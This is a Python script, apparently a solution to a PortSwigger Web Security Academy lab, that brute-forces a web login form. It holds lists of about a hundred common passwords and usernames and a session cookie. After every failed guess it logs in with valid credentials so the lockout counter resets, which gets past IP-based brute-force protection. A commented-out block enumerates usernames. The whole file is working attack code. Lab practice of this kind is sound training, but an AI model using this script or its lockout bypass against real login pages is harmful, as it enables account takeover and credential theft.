#!/usr/bin/python3

import requests
import string
import datetime
import time
from multiprocessing import Pool

import random
import socket
import struct
import hashlib
import base64

password_list = [
"123456",
"password",
"12345678",
"qwerty",
"123456789",
"12345",
"1234",
"111111",
"1234567",
"dragon",
"123123",
"baseball",
"abc123",
"football",
"monkey",
"letmein",
"shadow",
"master",
"666666",
"qwertyuiop",
"123321",
"mustang",
"1234567890",
"michael",
"654321",
"superman",
"1qaz2wsx",
"7777777",
"121212",
"000000",
"qazwsx",
"123qwe",
"killer",
"trustno1",
"jordan",
"jennifer",
"zxcvbnm",
"asdfgh",
"hunter",
"buster",
"soccer",
"harley",
"batman",
"andrew",
"tigger",
"sunshine",
"iloveyou",
"2000",
"charlie",
"robert",
"thomas",
"hockey",
"ranger",
"daniel",
"starwars",
"klaster",
"112233",
"george",
"computer",
"michelle",
"jessica",
"pepper",
"1111",
"zxcvbn",
"555555",
"11111111",
"131313",
"freedom",
"777777",
"pass",
"maggie",
"159753",
"aaaaaa",
"ginger",
"princess",
"joshua",
"cheese",
"amanda",
"summer",
"love",
"ashley",
"nicole",
"chelsea",
"biteme",
"matthew",
"access",
"yankees",
"987654321",
"dallas",
"austin",
"thunder",
"taylor",
"matrix",
"mobilemail",
"mom",
"monitor",
"monitoring",
"montana",
"moon",
"moscow"
]

username_list = [
"carlos",
"root",
"admin",
"test",
"guest",
"info",
"adm",
"mysql",
"user",
"administrator",
"oracle",
"ftp",
"pi",
"puppet",
"ansible",
"ec2-user",
"vagrant",
"azureuser",
"academico",
"acceso",
"access",
"accounting",
"accounts",
"acid",
"activestat",
"ad",
"adam",
"adkit",
"admin",
"administracion",
"administrador",
"administrator",
"administrators",
"admins",
"ads",
"adserver",
"adsl",
"ae",
"af",
"affiliate",
"affiliates",
"afiliados",
"ag",
"agenda",
"agent",
"ai",
"aix",
"ajax",
"ak",
"akamai",
"al",
"alabama",
"alaska",
"albuquerque",
"alerts",
"alpha",
"alterwind",
"am",
"amarillo",
"americas",
"an",
"anaheim",
"analyzer",
"announce",
"announcements",
"antivirus",
"ao",
"ap",
"apache",
"apollo",
"app",
"app01",
"app1",
"apple",
"application",
"applications",
"apps",
"appserver",
"aq",
"ar",
"archie",
"arcsight",
"argentina",
"arizona",
"arkansas",
"arlington",
"as",
"as400",
"asia",
"asterix",
"at",
"athena",
"atlanta",
"atlas",
"att",
"au",
"auction",
"austin",
"auth",
"auto",
"autodiscover"
]

session = 'sPjINCNJaWIm9sEfxZVFlHAjdggiAFJt'
endpoint = "https://0a240027044de690c0feb40c005d0039.web-security-academy.net/login"
check_string = 'Invalid'
check_password = 'Incorrect password'

valid = {"username": "wiener", "password": "peter"}
'''
for i, username in enumerate(username_list):
    cookies = { 'session': session }
    test = {"username": username , "password": "TRIGGER"}
    if i % 2 == 0:
        r = requests.post(endpoint,cookies=cookies,data=valid)
    r = requests.post(endpoint,cookies=cookies,data=test)
    if check_string not in r.text:
        print("Cracked username: " + username)
'''
for i, pw in enumerate(password_list):
    cookies = { 'session': session }
    test = {"username": 'carlos' , "password": pw}
    if i % 2 == 0:
        r = requests.post(endpoint,cookies=cookies,data=valid)
    r = requests.post(endpoint,cookies=cookies,data=test)
    if check_password not in r.text:
        print("Cracked password: " + pw)



    
    
